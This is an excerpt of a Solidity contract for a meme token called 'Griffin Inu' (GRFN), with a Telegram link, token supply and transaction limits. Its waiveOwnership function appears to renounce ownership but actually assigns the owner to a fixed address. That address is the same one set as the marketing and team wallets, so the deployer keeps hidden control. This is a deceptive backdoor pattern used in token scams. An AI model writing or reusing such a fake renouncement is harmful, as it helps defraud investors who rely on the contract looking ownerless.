...
/**
Telegram : https://t.me/griffininu100x
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xA339C0ffca2075184f1bd42d9A7952838a426981);
    }
...
contract GRFN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Griffin Inu";
    string private _symbol = "GRFN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA339C0ffca2075184f1bd42d9A7952838a426981);
    address payable public teamWalletAddress = payable(0xA339C0ffca2075184f1bd42d9A7952838a426981);
    ...
    uint256 private _totalSupply =  120000000 * 10**_decimals;
    uint256 public _maxTxAmount =   2400000 * 10**_decimals;     
    uint256 public _walletMax =     2400000 * 10**_decimals;      
